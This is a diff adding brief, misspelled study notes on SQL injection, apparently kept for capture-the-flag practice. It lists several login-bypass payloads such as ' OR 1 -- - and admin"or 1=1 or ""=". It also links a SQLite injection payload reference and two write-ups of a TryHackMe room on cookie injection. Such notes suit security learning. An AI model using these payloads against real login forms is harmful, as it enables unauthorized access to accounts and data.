@@ -1,0 +1,22 @@
+sql
+
+some sql payload say username and password worng
+
+and some say some internal error
+
+so combine them all
+
+```
+`' OR 1 -- - say usernam/internal
+``" OR "" = "` 
+```
+
+```
+so payload here is admin"or 1=1 or ""="                    or in  small
+```
+
+sqllite3 injectios  [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL Injection/SQLite Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
+
+cookie injection  https://muirlandoracle.co.uk/2020/09/04/year-of-the-dog-write-up/
+
+https://arkadiusz-kotela.medium.com/tryhackme-year-of-the-dog-write-up-d8e7df16c84d  cookie injection
